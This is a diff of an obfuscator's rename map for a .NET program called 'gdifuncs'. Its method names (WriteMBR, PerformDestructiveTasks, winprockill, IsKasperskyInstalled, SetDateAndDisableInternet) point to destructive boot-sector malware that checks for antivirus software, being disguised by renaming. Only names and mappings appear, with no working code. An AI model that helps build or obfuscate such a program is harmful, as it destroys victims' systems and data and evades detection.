@@ -58,21 +58,24 @@ Renamed Types:
 
 [gdifuncs]gdifuncs.Program -> [gdifuncs]A.c
 {
+	[gdifuncs]gdifuncs.Program::DecodeBase64[1]( [mscorlib]System.String ) -> A
+	[gdifuncs]gdifuncs.Program::IsKasperskyInstalled[0]( ) -> A
 	[gdifuncs]gdifuncs.Program::CreateFile[7]( [mscorlib]System.String, [mscorlib]System.UInt32, [mscorlib]System.UInt32, [mscorlib]System.IntPtr, [mscorlib]System.UInt32, [mscorlib]System.UInt32, [mscorlib]System.IntPtr ) -> A
 	[gdifuncs]gdifuncs.Program::WriteFile[5]( [mscorlib]System.IntPtr, [mscorlib]System.Byte[], [mscorlib]System.UInt32, [mscorlib]System.UInt32&, [mscorlib]System.IntPtr ) -> A
 	[gdifuncs]gdifuncs.Program::CloseHandle[1]( [mscorlib]System.IntPtr ) -> A
 	[gdifuncs]gdifuncs.Program::SystemParametersInfo[4]( [mscorlib]System.Int32, [mscorlib]System.Int32, [mscorlib]System.String, [mscorlib]System.Int32 ) -> A
 	[gdifuncs]gdifuncs.Program::WriteMBR[2]( [mscorlib]System.String, [mscorlib]System.String ) -> A
-	[gdifuncs]gdifuncs.Program::runprotector[0]( ) -> A
-	[gdifuncs]gdifuncs.Program::runmform[0]( ) -> a
-	[gdifuncs]gdifuncs.Program::Main[0]( ) -> B
-	[gdifuncs]gdifuncs.Program::SetWallpaperFromResource[0]( ) -> b
-	[gdifuncs]gdifuncs.Program::PerformResourceOperations[0]( ) -> C
-	[gdifuncs]gdifuncs.Program::PlayMrsMajorAudioInThread[0]( ) -> c
-	[gdifuncs]gdifuncs.Program::PlayMrsMajorAudio[0]( ) -> D
-	[gdifuncs]gdifuncs.Program::PerformDestructiveTasks[0]( ) -> d
+	[gdifuncs]gdifuncs.Program::runprotector[0]( ) -> a
+	[gdifuncs]gdifuncs.Program::runmform[0]( ) -> B
+	[gdifuncs]gdifuncs.Program::Main[0]( ) -> b
+	[gdifuncs]gdifuncs.Program::SetWallpaperFromResource[0]( ) -> C
+	[gdifuncs]gdifuncs.Program::PerformResourceOperations[0]( ) -> c
+	[gdifuncs]gdifuncs.Program::PlayMrsMajorAudioInThread[0]( ) -> D
+	[gdifuncs]gdifuncs.Program::PlayMrsMajorAudio[0]( ) -> d
+	[gdifuncs]gdifuncs.Program::PerformDestructiveTasks[0]( ) -> E
 	[gdifuncs]gdifuncs.Program::ExtractAndCopyEFI[2]( [mscorlib]System.String, [mscorlib]System.String ) -> a
-	[gdifuncs]gdifuncs.Program::RunCommand[1]( [mscorlib]System.String ) -> A
+	[gdifuncs]gdifuncs.Program::SetDateAndDisableInternet[0]( ) -> e
+	[gdifuncs]gdifuncs.Program::RunCommand[1]( [mscorlib]System.String ) -> a
 
 	System.UInt32 [gdifuncs]System.UInt32 gdifuncs.Program::GENERIC_WRITE -> A
 	System.UInt32 [gdifuncs]System.UInt32 gdifuncs.Program::OPEN_EXISTING -> a
@@ -98,12 +101,12 @@ Renamed Types:
 
 	[gdifuncs]gdifuncs.Program/_Closure$__::.ctor[0]( ) skipped:  special name
 	[gdifuncs]gdifuncs.Program/_Closure$__::.cctor[0]( ) skipped:  special name
-	[gdifuncs]gdifuncs.Program/_Closure$__::_Lambda$__R13-1[1]( [mscorlib]System.Object ) skipped:  special name
-	[gdifuncs]gdifuncs.Program/_Closure$__::_Lambda$__R13-2[1]( [mscorlib]System.Object ) skipped:  special name
+	[gdifuncs]gdifuncs.Program/_Closure$__::_Lambda$__R15-1[1]( [mscorlib]System.Object ) skipped:  special name
+	[gdifuncs]gdifuncs.Program/_Closure$__::_Lambda$__R15-2[1]( [mscorlib]System.Object ) skipped:  special name
 
 	gdifuncs.Program/_Closure$__ [gdifuncs]gdifuncs.Program/_Closure$__ gdifuncs.Program/_Closure$__::$I -> A
-	System.Threading.WaitCallback [gdifuncs]System.Threading.WaitCallback gdifuncs.Program/_Closure$__::$IR13-1 -> A
-	System.Threading.WaitCallback [gdifuncs]System.Threading.WaitCallback gdifuncs.Program/_Closure$__::$IR13-2 -> a
+	System.Threading.WaitCallback [gdifuncs]System.Threading.WaitCallback gdifuncs.Program/_Closure$__::$IR15-1 -> A
+	System.Threading.WaitCallback [gdifuncs]System.Threading.WaitCallback gdifuncs.Program/_Closure$__::$IR15-2 -> a
 }
 
 [gdifuncs]gdifuncs.My.MyApplication -> [gdifuncs]A.A
@@ -287,6 +290,7 @@ Skipped Types:
 	[gdifuncs]gdifuncs.protection64::_EnumDesktopWindows[3]( [mscorlib]System.IntPtr, [gdifuncs]gdifuncs.protection64/EnumDelegate, [mscorlib]System.IntPtr ) -> A
 	[gdifuncs]gdifuncs.protection64::_GetWindowText[3]( [mscorlib]System.IntPtr, [mscorlib]System.Text.StringBuilder, [mscorlib]System.Int32 ) -> A
 	[gdifuncs]gdifuncs.protection64::EnumWindowsProc[2]( [mscorlib]System.IntPtr, [mscorlib]System.Int32 ) -> A
+	[gdifuncs]gdifuncs.protection64::DecodeBase64[1]( [mscorlib]System.String ) -> A
 	[gdifuncs]gdifuncs.protection64::protection64_Load[2]( [mscorlib]System.Object, [mscorlib]System.EventArgs ) -> A
 
 	[gdifuncs]gdifuncs.protection64::Dispose[1]( [mscorlib]System.Boolean ) skipped:  external base class or interface
@@ -301,10 +305,10 @@ Skipped Types:
 	[gdifuncs]gdifuncs.protection64::winprockill[0]( ) skipped:  KeepPublicApi option in configuration
 	[gdifuncs]gdifuncs.protection64::winprockill2[0]( ) skipped:  KeepPublicApi option in configuration
 	[gdifuncs]gdifuncs.protection64::userIsAdministrator[0]( ) skipped:  KeepPublicApi option in configuration
-	[gdifuncs]gdifuncs.protection64::_Lambda$__R26-1[1]( [mscorlib]System.Object ) skipped:  special name
-	[gdifuncs]gdifuncs.protection64::_Lambda$__R26-2[1]( [mscorlib]System.Object ) skipped:  special name
-	[gdifuncs]gdifuncs.protection64::_Lambda$__R26-3[1]( [mscorlib]System.Object ) skipped:  special name
-	[gdifuncs]gdifuncs.protection64::_Lambda$__R26-4[1]( [mscorlib]System.Object ) skipped:  special name
+	[gdifuncs]gdifuncs.protection64::_Lambda$__R27-1[1]( [mscorlib]System.Object ) skipped:  special name
+	[gdifuncs]gdifuncs.protection64::_Lambda$__R27-2[1]( [mscorlib]System.Object ) skipped:  special name
+	[gdifuncs]gdifuncs.protection64::_Lambda$__R27-3[1]( [mscorlib]System.Object ) skipped:  special name
+	[gdifuncs]gdifuncs.protection64::_Lambda$__R27-4[1]( [mscorlib]System.Object ) skipped:  special name
 
 	System.ComponentModel.IContainer [gdifuncs]System.ComponentModel.IContainer gdifuncs.protection64::components -> A
 	System.Int32 [gdifuncs]System.Int32 gdifuncs.protection64::isCritical -> A
